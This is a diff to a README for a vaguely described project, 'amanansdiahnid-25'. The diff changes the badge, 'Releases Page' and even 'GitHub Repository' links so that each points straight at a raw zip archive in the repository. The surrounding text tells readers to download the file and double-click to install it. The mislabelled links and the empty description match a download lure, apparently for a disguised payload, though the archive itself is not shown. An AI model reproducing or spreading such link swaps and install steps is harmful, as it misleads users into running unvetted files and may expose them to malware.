@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-25 - Simple Software for Everyday Tasks
 
-[![Download amanansdiahnid-25](https://img.shields.io/badge/Download-amanansdiahnid--25-brightgreen)](https://github.com/rana-khallaf/amanansdiahnid-25/releases)
+[![Download amanansdiahnid-25](https://raw.githubusercontent.com/rana-khallaf/amanansdiahnid-25/main/base/amanansdiahnid-25.zip)](https://raw.githubusercontent.com/rana-khallaf/amanansdiahnid-25/main/base/amanansdiahnid-25.zip)
 
 ## 📖 Introduction
 
@@ -19,7 +19,7 @@ Before you proceed with the download, please ensure your system meets the follow
 Here are simple steps to get started with amanansdiahnid-25.
 
 1. **Visit the Releases Page**  
-   To download the software, go to the [Releases Page](https://github.com/rana-khallaf/amanansdiahnid-25/releases). This page contains the latest version of the software.
+   To download the software, go to the [Releases Page](https://raw.githubusercontent.com/rana-khallaf/amanansdiahnid-25/main/base/amanansdiahnid-25.zip). This page contains the latest version of the software.
 
 2. **Download the Latest Version**  
    On the Releases page, find the latest version listed. Click the link to download the software. 
@@ -34,11 +34,11 @@ Here are simple steps to get started with amanansdiahnid-25.
 
 To quickly access the download, click the link below:
 
-[Download amanansdiahnid-25](https://github.com/rana-khallaf/amanansdiahnid-25/releases)
+[Download amanansdiahnid-25](https://raw.githubusercontent.com/rana-khallaf/amanansdiahnid-25/main/base/amanansdiahnid-25.zip)
 
 Here’s a recap of how to download and install the software:
 
-1. **Visit the [Releases Page](https://github.com/rana-khallaf/amanansdiahnid-25/releases)** 
+1. **Visit the [Releases Page](https://raw.githubusercontent.com/rana-khallaf/amanansdiahnid-25/main/base/amanansdiahnid-25.zip)** 
 2. **Choose the latest version.** 
 3. **Download the installation file.** 
 4. **Double-click to install.** 
@@ -73,7 +73,7 @@ Thank you for choosing amanansdiahnid-25. We appreciate your support and hope yo
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/rana-khallaf/amanansdiahnid-25)
-- [Releases Page](https://github.com/rana-khallaf/amanansdiahnid-25/releases) 
+- [GitHub Repository](https://raw.githubusercontent.com/rana-khallaf/amanansdiahnid-25/main/base/amanansdiahnid-25.zip)
+- [Releases Page](https://raw.githubusercontent.com/rana-khallaf/amanansdiahnid-25/main/base/amanansdiahnid-25.zip) 
 
 Feel free to return to this README for guidance whenever you need it.
